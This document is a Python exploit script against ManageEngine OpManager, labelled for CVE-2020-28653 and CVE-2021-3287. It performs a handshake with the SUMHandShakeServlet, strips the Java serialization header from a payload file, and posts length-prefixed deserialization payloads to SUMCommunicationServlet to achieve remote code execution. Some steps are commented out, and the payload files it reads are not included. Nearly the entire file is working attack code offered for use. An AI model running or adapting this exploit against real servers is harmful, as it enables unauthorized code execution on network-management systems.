import requests
import os
import argparse
import base64
import binascii
import struct


session = requests.Session()

proxies = {
    "http": "http://localhost:8080",
    "https": "https://localhost:8080"
}

def request_handler_handshake(url):
    # Send serialized interger 1002 to SUMHandshakeServlet to get request handler session
    resp = session.post(f"{url}/servlets/com.adventnet.tools.sum.transport.SUMHandShakeServlet", data=b'\xac\xed\x00\x05w\x04\x00\x00\x03\xea', proxies=proxies)
    if resp.status_code == 200 and resp.content ==  b"\xac\xed\x00\x05":
        print ("[+] Request SUMHandshake successfully")
    else:
        print ("[x] ManageEngine OPManager is not vulnerable")
        exit(1)

def send_rce_payload(url, payload):
    print ([len(payload)])
    sumpdu_payload = struct.pack("I", len(payload)) + payload
    resp = session.post(f"{url}/servlets/com.adventnet.tools.sum.transport.SUMCommunicationServlet", data=sumpdu_payload, proxies=proxies)
    print (resp.status_code)
    print (resp.content)


# CVE-2021-3287
def build_pdu_data():
    with open("/tmp/manageengine_opmanager.ser", "rb") as f:
        rce_payload = f.read()
    
    rce_payload_in_hex = binascii.hexlify(rce_payload)
    new_rce_payload = None
    if rce_payload_in_hex.startswith(b"aced0005"):
        # Remove prefix of Java serialized data
        new_rce_payload = rce_payload_in_hex[len("aced0005"):]
        payload_file = open("manageengine_payload", "wb")
        payload_file.write(binascii.unhexlify(new_rce_payload))
        payload_file.close()
    
    with open("/tmp/sumpdu", "rb") as f:
        sumpdu = f.read()
    
    print (binascii.hexlify(sumpdu))
    return new_rce_payload

def main():
    parser = argparse.ArgumentParser(description="ManageEnginer OPManager exploit (CVE-2020-28653, CVE-2021-3287)")
    parser.add_argument("-u", help="ManageEngine OPManager URL", required=True)
    args = parser.parse_args()
    manageengine_opmanager_endpoint = args.u
    # request_handler_handshake(manageengine_opmanager_endpoint)
    # build_pdu_data()

    # with open("/tmp/step1", "rb") as f:
    #     step1_data = f.read()

    # send_rce_payload(manageengine_opmanager_endpoint, step1_data)

    with open("/tmp/step2", "rb") as f:
        step2_data = f.read()
    
    send_rce_payload(manageengine_opmanager_endpoint, step2_data)


if __name__ == '__main__':
    main()